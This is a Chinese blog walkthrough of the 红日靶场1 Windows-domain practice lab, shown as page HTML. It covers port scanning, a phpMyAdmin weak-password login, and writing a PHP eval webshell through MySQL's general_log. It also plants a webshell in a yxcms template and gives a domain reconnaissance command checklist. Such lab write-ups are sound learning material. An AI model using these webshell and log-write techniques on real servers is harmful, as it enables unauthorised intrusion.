@@ -1,0 +1,743 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>红日靶场1 :: l1uyun_blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta charset="UTF-8"/>
+<meta name="renderer" content="webkit"/>
+<meta name="force-rendering" content="webkit"/>
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="前言 之前打了一个linux域的靶机,在巨魔的wp站里看见了红日靶场系列,学习一下win域
+红日靶场1-win域 环境搭建 下载完之后,解压,并在vmware中扫描虚拟机
+根据这个网络拓扑图,win7机器有两个网卡,是通外网的,win2003和win2008是在内网环境中
+先给win7添加一下网卡,这里我习惯使用桥接,所以另一个网卡是桥接模式
+"/>
+<meta name="keywords" content=""/>
+
+<link href="/atom.xml" title="l1uyun_blog" type="application/rss+xml">
+<link rel="canonical" href="https://l1uyun.one/posts/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/" />
+<link rel="stylesheet" href="//cdn.staticfile.org/lxgw-wenkai-screen-webfont/1.6.0/lxgwwenkaiscreen.css" media="print" onload="this.media='all'">
+<link rel="stylesheet" href="/theme-20230215.css">
+<link rel="shortcut icon" href="https://l1uyun.one/favicon.ico">
+<link rel="apple-touch-icon" href="https://l1uyun.one/favicon.ico">
+<link rel="bookmark" href="https://l1uyun.one/favicon.ico">
+<link rel="apple-touch-icon-precomposed" sizes="180x180" href="https://l1uyun.one/favicon.ico">
+
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+<meta name="apple-mobile-web-app-title" content="l1uyun_blog">
+
+<script defer src="https://cn.vercount.one/js"></script>
+<meta property="og:url" content="https://l1uyun.one/posts/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/">
+  <meta property="og:site_name" content="l1uyun_blog">
+  <meta property="og:title" content="红日靶场1">
+  <meta property="og:description" content="前言 之前打了一个linux域的靶机,在巨魔的wp站里看见了红日靶场系列,学习一下win域
+红日靶场1-win域 环境搭建 下载完之后,解压,并在vmware中扫描虚拟机
+根据这个网络拓扑图,win7机器有两个网卡,是通外网的,win2003和win2008是在内网环境中
+先给win7添加一下网卡,这里我习惯使用桥接,所以另一个网卡是桥接模式">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-25T16:08:47+08:00">
+    <meta property="article:modified_time" content="2024-10-27T08:49:57+08:00">
+    <meta property="article:tag" content="Sec">
+
+
+
+
+<script>
+if ( false || (!!window.MSInputMethodContext && !!document.documentMode)) {
+    document.write('\x3Cscript id="_iealwn_js" data-outver="11" src="https://support.dmeng.net/ie-alert-warning/latest.js">\x3C/script>');
+}
+</script>
+<script async defer data-website-id="c27bd84b-02a3-4c3f-a168-0d7fadec9c74" src="https://u.edui.fun/lmmtj.js"></script>
+
+    
+  <link rel="prefetch" href="https://l1uyun.one/posts/phpmyadmin-4.8.1%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+  <link rel="prefetch" href="https://l1uyun.one/posts/puff-pastry%E6%89%93%E9%9D%B6/">
+
+  </head>
+  <body class="">
+    <script>var getTheme = localStorage.getItem("theme") || '';if(getTheme == 'dark'){document.body.classList.add("dark")}else if(getTheme == 'light'){document.body.classList.remove("dark")}</script>
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="https://l1uyun.one/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__text">l1uyun_blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu hidden">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/posts/reading/">读书</a></li>
+        
+      
+        
+          <li><a href="/posts/sec/">sec</a></li>
+        
+      
+        
+          <li><a href="/posts/chat/">闲聊</a></li>
+        
+      
+        
+          <li><a href="/archives/">归档</a></li>
+        
+      
+        
+          <li><a href="/about/">关于我</a></li>
+        
+      
+        
+          <li><a href="/search/">🔍</a></li>
+        
+      
+    
+    <li><a href="javascript:;" onclick="randomPost()" title="随机访问一篇文章"><svg t="1660103436159" class="icon search-box-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1184" width="32" height="32"><path d="M421.376 481.28s117.248 24.576 175.104-8.704c0 0-89.6 70.144-89.6 166.4 0.512-0.512-8.192-121.344-85.504-157.696zM438.784 969.216s68.608 6.656 68.608-80.896c0 0 3.072 88.576 65.024 78.336 0 0.512-50.688 22.016-133.632 2.56zM161.28 238.08s-30.208 65.536 11.264 91.648c0 0-67.072-17.408-81.408 37.376 0 0 8.704-82.944 70.144-129.024zM857.6 227.328s49.152 50.176 1.024 81.408c0 0 58.88-18.432 66.56 36.352 0 0 5.12-69.632-67.584-117.76z" p-id="1185"></path><path d="M443.392 970.752c-5.632 0-10.752-1.024-15.36-3.072l-270.848-157.184-1.536-1.024s-1.024-1.024-4.608-2.56c-51.2-29.184-62.976-94.208-65.536-120.832V386.56c0-3.072 0.512-7.168 1.024-11.264l0.512-3.584 1.024-2.56c19.456-50.688 76.8-51.2 103.936-44.032l-1.536 5.632 4.096-6.144L476.16 486.4l18.944 37.888c20.992 36.864 29.184 77.824 32.768 99.84v258.048c-4.608 56.32-36.864 76.288-55.808 82.944-1.024 0.512-15.36 5.632-28.672 5.632z m-262.144-196.096l263.168 152.576c12.288-0.512 36.864-6.656 40.448-48.128v-250.368c-4.608-31.744-20.992-103.936-72.192-128L322.56 445.44l1.536 3.072-142.336-82.432c-2.048-0.512-40.448-9.216-52.736 15.872-0.512 2.56-0.512 4.608-0.512 6.144v294.4c1.536 16.896 9.728 67.072 43.52 86.528 3.584 2.048 6.656 4.096 9.216 5.632z" p-id="1186"></path><path d="M837.632 212.992c6.656 4.096 12.8 7.168 18.432 10.752l1.536 1.024 1.536 1.536c5.12 4.096 10.752 9.216 16.384 15.36 6.144 11.776 5.632 33.28 4.608 49.152-1.024 12.288-6.656 30.208-26.624 44.544l-1.024 0.512-247.808 156.672c-26.624 14.336-62.976 18.432-96.256 18.432-40.96 0-77.824-6.656-89.088-8.704l-3.072-0.512-245.248-142.336c-39.424-29.696-28.16-85.504-15.36-113.664l2.56-6.144 263.68-166.912c29.184-14.336 104.448-43.008 173.056-1.024 3.584 2.56 58.368 34.304 119.296 69.632M431.616 460.8c40.448 7.168 114.176 13.824 152.576-6.144l244.736-155.136c7.168-5.632 8.192-10.24 8.704-12.8 1.024-11.264-9.728-26.624-15.36-32.768-55.808-32.256-243.712-141.312-250.368-145.408-49.664-30.72-107.008-9.216-130.048 2.56L192.512 268.8c-4.096 12.288-12.288 42.496 3.584 55.808l235.52 136.192z" p-id="1187"></path><path d="M831.488 299.008c4.096-1.024 38.4-11.264 66.048 6.144 7.168 4.608 17.92 11.776 24.064 24.576 1.024 5.632 4.096 10.752 4.608 16.896v2.048l-1.024 323.072c-5.12 35.328-22.528 91.648-77.312 125.44l-5.12 3.584h-1.024l-262.144 165.888-4.608 0.512c-4.096 0.512-8.704 1.024-12.8 1.024-15.872 0-30.208-5.12-41.984-14.848-24.576-20.48-32.768-55.808-35.328-73.728l-1.024-252.928h1.536c6.144-96.768 88.576-164.864 96.768-171.008l-0.512-0.512L829.44 299.52m-301.056 567.808c0.512 10.24 5.12 41.472 19.968 53.76 3.072 2.56 7.68 5.632 16.384 5.12l264.704-167.936c56.32-38.4 53.76-115.712 53.76-116.224l-0.512-32.256 1.024-250.368h-0.512c-1.536-12.8-7.168-16.384-8.704-17.408-8.704-5.632-23.552-3.072-28.672-2.048l-235.52 148.992c-1.024 0.512-80.896 65.024-80.896 149.504h-1.536l0.512 228.864zM435.2 264.192c0 27.648 31.744 50.176 71.168 50.176s71.168-22.528 71.168-50.176-31.744-50.176-71.168-50.176S435.2 236.544 435.2 264.192z" p-id="1188"></path><path d="M663.552 782.848c0 30.72-22.528 67.072-49.664 80.384-27.648 13.824-50.176-0.512-50.176-31.232s22.528-67.072 50.176-80.384c27.136-13.824 49.664 0 49.664 31.232zM760.32 602.624c0 30.72-22.528 67.072-49.664 80.384-27.648 13.824-49.664-0.512-49.664-31.232s22.528-67.072 49.664-80.384c27.136-13.824 49.664 0.512 49.664 31.232zM867.84 428.032c0 30.72-22.528 67.072-49.664 80.384-27.648 13.824-50.176-0.512-50.176-31.232s22.528-67.072 50.176-80.384c27.136-13.824 49.664 0 49.664 31.232zM270.848 538.112c0 30.72-22.016 41.984-48.64 24.576-27.136-16.896-48.64-55.808-48.64-86.528 0-30.72 22.016-41.984 48.64-24.576 26.624 16.896 48.64 55.808 48.64 86.528zM432.128 823.296c0 30.72-22.016 41.984-48.64 24.576-26.624-17.408-48.64-55.808-48.64-86.528 0-30.72 22.016-41.984 48.64-24.576 26.624 16.896 48.64 55.808 48.64 86.528z" p-id="1189"></path></svg></a></li>
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/posts/reading/">读书</a></li>
+      
+    
+      
+        <li><a href="/posts/sec/">sec</a></li>
+      
+    
+      
+        <li><a href="/posts/chat/">闲聊</a></li>
+      
+    
+      
+        <li><a href="/archives/">归档</a></li>
+      
+    
+      
+        <li><a href="/about/">关于我</a></li>
+      
+    
+      
+        <li><a href="/search/">🔍</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger hidden">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+
+      <div class="content">
+        
+  
+  
+  
+  
+  <div class="post sec">
+    <div  class="breadcrumb">
+  
+
+  
+
+  
+
+  
+
+<li>
+  <a href="https://l1uyun.one/">首页</a>
+</li>
+
+
+<li>
+  <a href="https://l1uyun.one/posts/">Posts</a>
+</li>
+
+
+<li>
+  <a href="https://l1uyun.one/posts/sec/">sec</a>
+</li>
+
+
+<li class="active">
+  <a href="https://l1uyun.one/posts/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/">红日靶场1</a>
+</li>
+
+</div>
+
+
+  
+    <h2 class="post-title"><a href="https://l1uyun.one/posts/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/">红日靶场1</a></h2>
+    <div class="post-meta">
+      <div  class="meta-item">
+        本文总阅读量 <span id="vercount_value_page_pv">Loading</span> 次
+      </div>
+      
+        <span class="post-date">2024-08-25</span>
+        
+          
+        
+      
+    </div>
+    
+  
+    <div class="post-content">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#红日靶场1-win域">红日靶场1-win域</a>
+      <ul>
+        <li><a href="#环境搭建">环境搭建</a></li>
+        <li><a href="#外网渗透">外网渗透</a>
+          <ul>
+            <li><a href="#端口扫描">端口扫描</a></li>
+            <li><a href="#phpmyadmin弱口令日志写入getshell">phpmyadmin弱口令+日志写入Getshell</a></li>
+            <li><a href="#yxcms后台修改模板getshell">yxcms后台修改模板Getshell</a></li>
+          </ul>
+        </li>
+        <li><a href="#内网渗透">内网渗透</a>
+          <ul>
+            <li><a href="#信息收集">信息收集</a></li>
+            <li><a href="#尝试rdp">尝试rdp</a></li>
+            <li><a href="#msf上线">msf上线</a></li>
+            <li><a href="#getsystem提权">getsystem提权</a></li>
+            <li><a href="#迁移进程">迁移进程</a></li>
+            <li><a href="#收集凭据">收集凭据</a></li>
+            <li><a href="#搭建socks隧道">搭建socks隧道</a></li>
+            <li><a href="#主机探测">主机探测</a></li>
+            <li><a href="#端口扫描-1">端口扫描</a></li>
+            <li><a href="#ms17_010永恒之蓝">ms17_010永恒之蓝</a></li>
+            <li><a href="#cs上线">cs上线</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#l1uyun">l1uyun</a></li>
+    <li><a href="#links">links</a></li>
+  </ul>
+</nav>
+      <h1 id="前言">前言</h1>
+<p>之前打了一个linux域的靶机,在巨魔的wp站里看见了红日靶场系列,学习一下win域</p>
+<h1 id="红日靶场1-win域">红日靶场1-win域</h1>
+<h2 id="环境搭建">环境搭建</h2>
+<p>下载完之后,解压,并在vmware中扫描虚拟机</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_1.png" alt=""  /></p>
+<p>根据这个网络拓扑图,win7机器有两个网卡,是通外网的,win2003和win2008是在内网环境中</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_2.png" alt=""  /></p>
+<p>先给win7添加一下网卡,这里我习惯使用桥接,所以另一个网卡是桥接模式</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_3.png" alt=""  /></p>
+<p>然后再为另外两台机器设置only-host模式,并在网络编辑器中将这个模式的网段修改为192.168.53.0/24</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_4.png" alt=""  /></p>
+<p>最后进入win7机器,进去之后要改默认密码(hongrisec@2019),改成了l1uyun@2024,启动web服务器.</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_5.png" alt="|536"  /></p>
+<h2 id="外网渗透">外网渗透</h2>
+<h3 id="端口扫描">端口扫描</h3>
+<p>win7机器是桥接在192.168.71.0/24这个子网的</p>
+<p>arp-scan扫描局域网内主机</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>~/workspace<span style="color:#f92672">]</span>$ sudo arp-scan -I eth5 -l
+</span></span><span style="display:flex;"><span>Interface: eth5, type: EN10MB, MAC: f6:39:4a:3d:95:18, IPv4: 192.168.71.99
+</span></span><span style="display:flex;"><span>Starting arp-scan 1.10.0 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>192.168.71.79   00:0c:29:a7:c1:b2       VMware, Inc.
+</span></span><span style="display:flex;"><span>192.168.71.244  ca:a7:78:4d:50:e1       <span style="color:#f92672">(</span>Unknown: locally administered<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> packets received by filter, <span style="color:#ae81ff">0</span> packets dropped by kernel
+</span></span><span style="display:flex;"><span>Ending arp-scan 1.10.0: <span style="color:#ae81ff">256</span> hosts scanned in 2.108 seconds <span style="color:#f92672">(</span>121.44 hosts/sec<span style="color:#f92672">)</span>. <span style="color:#ae81ff">2</span> responded
+</span></span></code></pre></div><p>使用nmap来扫描一下这个主机</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  workspace  sudo nmap -sS -Pn 192.168.71.79  -p- --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-25 16:26 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.247.79
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00054s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp   open  http
+</span></span><span style="display:flex;"><span>3306/tcp open  mysql
+</span></span><span style="display:flex;"><span>MAC Address: 00:0C:29:A7:C1:B2 <span style="color:#f92672">(</span>VMware<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>➜  workspace  sudo nmap -sT -Pn 192.168.71.79  -p80,3306 -A  --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-25 16:29 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.247.79
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00049s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>80/tcp   open  http    Apache httpd 2.4.23 <span style="color:#f92672">((</span>Win32<span style="color:#f92672">)</span> OpenSSL/1.0.2j PHP/5.4.45<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: phpStudy <span style="color:#ae81ff">\x</span>E6<span style="color:#ae81ff">\x</span>8E<span style="color:#ae81ff">\x</span>A2<span style="color:#ae81ff">\x</span>E9<span style="color:#ae81ff">\x</span>92<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">88</span> <span style="color:#ae81ff">2014</span> 
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.23 <span style="color:#f92672">(</span>Win32<span style="color:#f92672">)</span> OpenSSL/1.0.2j PHP/5.4.45
+</span></span><span style="display:flex;"><span>3306/tcp open  mysql   MySQL <span style="color:#f92672">(</span>unauthorized<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>MAC Address: 00:0C:29:A7:C1:B2 <span style="color:#f92672">(</span>VMware<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: phone|specialized|general purpose
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows Phone|7|8.1|2008|Vista <span style="color:#f92672">(</span>96%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows_server_2008::beta3 cpe:/o:microsoft:windows_server_2008 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_8
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 <span style="color:#f92672">(</span>96%<span style="color:#f92672">)</span>, Microsoft Windows Embedded Standard <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>96%<span style="color:#f92672">)</span>, Microsoft Windows 8.1 R1 <span style="color:#f92672">(</span>94%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> or <span style="color:#ae81ff">2008</span> Beta <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 or Windows 8.1 <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows Vista SP0 or SP1, Windows Server <span style="color:#ae81ff">2008</span> SP1, or Windows <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows Vista SP2, Windows <span style="color:#ae81ff">7</span> SP1, or Windows Server <span style="color:#ae81ff">2008</span> <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> Professional or Windows <span style="color:#ae81ff">8</span> <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> SP1 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">1</span> hop
+</span></span></code></pre></div><p>再对mysql扫一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  workspace  sudo nmap -sS -Pn 192.168.71.79  -p3306 --script<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*sql*&#34;</span>  --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-25 16:31 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.247.79
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00034s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>3306/tcp open  mysql
+</span></span><span style="display:flex;"><span>|_mysql-empty-password: Host <span style="color:#e6db74">&#39;192.168.247.149&#39;</span> is not allowed to connect to this MySQL server
+</span></span><span style="display:flex;"><span>| mysql-enum: 
+</span></span><span style="display:flex;"><span>|   Accounts: No valid accounts found
+</span></span><span style="display:flex;"><span>|_  Statistics: Performed <span style="color:#ae81ff">10</span> guesses in <span style="color:#ae81ff">1</span> seconds, average tps: 10.0
+</span></span><span style="display:flex;"><span>| mysql-brute: 
+</span></span><span style="display:flex;"><span>|   Accounts: No valid accounts found
+</span></span><span style="display:flex;"><span>|_  Statistics: Performed <span style="color:#ae81ff">50009</span> guesses in <span style="color:#ae81ff">24</span> seconds, average tps: 2012.9
+</span></span><span style="display:flex;"><span>MAC Address: 00:0C:29:A7:C1:B2 <span style="color:#f92672">(</span>VMware<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h3 id="phpmyadmin弱口令日志写入getshell">phpmyadmin弱口令+日志写入Getshell</h3>
+<p>进去之后是phpstudy页面,数据库这里使用root,root测试成功</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_6.png" alt=""  /></p>
+<p>尝试在外面连接,连不上去</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  workspace  mysql -h 192.168.71.79 -u root -p
+</span></span><span style="display:flex;"><span>Enter password:
+</span></span></code></pre></div><p>扫目录发现存在phpmyadmin,phpstudy这玩意集成了phpmyadmin</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_7.png" alt=""  /></p>
+<p>这里的secure_file_priv=NULL,不允许导入导出,所以不能直接写入shell</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_8.png" alt=""  /></p>
+<p>再尝试一下通过日志Getshell的方法</p>
+<p>SHOW VARIABLES LIKE &lsquo;%general_log%&rsquo;</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_9.png" alt=""  /></p>
+<p>启用日志功能,然后修改日志文件路径,这里的绝对路径是在php探针里面泄露的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set global general_log <span style="color:#f92672">=</span> on;
+</span></span><span style="display:flex;"><span>set global general_log_file<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;C:/phpStudy/WWW/shell.php&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#e6db74">&#34;&lt;?php @eval(</span>$_POST<span style="color:#e6db74">[&#39;123&#39;]);?&gt;&#34;</span>
+</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_10.png" alt=""  /></p>
+<p>使用蚁剑连接,拿到shell</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_11.png" alt=""  /></p>
+<h3 id="yxcms后台修改模板getshell">yxcms后台修改模板Getshell</h3>
+<p>以学习为主,phpmyadmin拿到shell之后,再看看有没有其他的拿shell的方法吧</p>
+<p>查看路径,发现有个yxcms,进去看看</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_12.png" alt=""  /></p>
+<p>这都不用搜索了,前台模板这个位置大概率能执行php代码</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_13.png" alt=""  /></p>
+<p>找到这个layout.php,这个文件是每个页面都需要包含的,所以在这里写入webshell</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_14.png" alt=""  /></p>
+<p>可以连接</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_15.png" alt=""  /></p>
+<p>这个cms里面也有sql执行,就不看了</p>
+<h2 id="内网渗透">内网渗透</h2>
+<h3 id="信息收集">信息收集</h3>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_16.png" alt=""  /></p>
+<p>域渗透信息收集checklist</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> ipconfig /all   <span style="color:#75715e"># 查看本机ip，所在域</span>
+</span></span><span style="display:flex;"><span> route print     <span style="color:#75715e"># 打印路由信息</span>
+</span></span><span style="display:flex;"><span> net view        <span style="color:#75715e"># 查看局域网内其他主机名</span>
+</span></span><span style="display:flex;"><span> arp -a          <span style="color:#75715e"># 查看arp缓存</span>
+</span></span><span style="display:flex;"><span> net start       <span style="color:#75715e"># 查看开启了哪些服务</span>
+</span></span><span style="display:flex;"><span> net share       <span style="color:#75715e"># 查看开启了哪些共享</span>
+</span></span><span style="display:flex;"><span> net share ipc$  <span style="color:#75715e"># 开启ipc共享</span>
+</span></span><span style="display:flex;"><span> net share c$    <span style="color:#75715e"># 开启c盘共享</span>
+</span></span><span style="display:flex;"><span> net use <span style="color:#ae81ff">\\</span>192.168.xx.xx<span style="color:#ae81ff">\i</span>pc$ <span style="color:#e6db74">&#34;&#34;</span> /user:<span style="color:#e6db74">&#34;&#34;</span>    <span style="color:#75715e"># 与192.168.xx.xx建立空连接</span>
+</span></span><span style="display:flex;"><span> net use <span style="color:#ae81ff">\\</span>192.168.xx.xx<span style="color:#ae81ff">\c</span>$ <span style="color:#e6db74">&#34;密码&#34;</span> /user:<span style="color:#e6db74">&#34;用户名&#34;</span>    <span style="color:#75715e"># 建立c盘共享</span>
+</span></span><span style="display:flex;"><span> dir <span style="color:#ae81ff">\\</span>192.168.xx.xx<span style="color:#ae81ff">\c</span>$<span style="color:#ae81ff">\u</span>ser    <span style="color:#75715e"># 查看192.168.xx.xx c盘user目录下的文件</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span> net config Workstation    <span style="color:#75715e"># 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span>
